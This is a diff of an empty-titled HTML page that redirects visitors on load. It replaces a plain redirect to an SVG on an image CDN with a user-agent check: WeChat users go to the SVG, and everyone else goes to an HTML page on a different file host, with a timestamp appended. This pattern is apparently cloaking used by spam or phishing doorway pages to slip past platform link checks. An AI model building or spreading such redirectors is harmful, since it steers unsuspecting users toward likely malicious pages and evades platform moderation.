@@ -2,11 +2,20 @@
 <html>
 <head>
   <title></title>
-  <meta http-equiv="refresh" content="0; URL=https://pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg?co1">
+  <script>
+    var isWeChat = navigator.userAgent.toLowerCase().match(/micromessenger/i);
+    var redirectURL;
+    
+    if (isWeChat) {
+      redirectURL = "https://pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg?co1";
+    } else {
+      redirectURL = "https://yun-src.leju.com/31-2-AdRcEQ33zOli5QDNK7untXcQN6sB0u2NK7gXVCtvEGka61RMkbYyhXwu8wRfUgeA28L1JB1gGFE7rCv2.html?u=co1";
+    }
+    
+    redirectURL += "&_t=" + Date.now();
+    window.location.replace(redirectURL);
+  </script>
 </head>
 <body>
-  <script>
-   window.location.replace("https://pic6.58cdn.com.cn/nowater/gjImageFile/n_v3d8c5a4720251423496c5a1f56b3029a3.svg?co1");
-  </script>
 </body>
 </html>
